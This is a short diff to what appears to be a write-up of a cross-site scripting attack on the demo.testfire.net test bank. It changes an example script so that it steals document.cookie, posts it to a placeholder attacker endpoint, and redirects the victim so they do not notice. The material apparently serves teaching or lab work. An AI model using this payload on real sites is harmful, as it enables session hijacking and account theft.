@@ -35,10 +35,14 @@ The Malicious Script loaded fetch via link `https://maliciousScriptURL/malicious
 ```
 function maliciousScript() {
 	var val = document.getElementById("query").value;
-	$.post("maliciousServerEndpoint",
+  
+  // Posting the cookie to 'maliciousServerEndpoint' on the 'maliciousServer'
+  var cookieData = document.cookie;
+	$.post("[maliciousServerEndpoint]",
 	  {
-		"feedbackText": val
+		"userCookie": cookieData
 	  });
+   // We will send the feedback from the user, so that the user does not gets suspecious
 	 window.location = "http://demo.testfire.net/bank/queryxpath.jsp?query=" + val;
 }
 ```
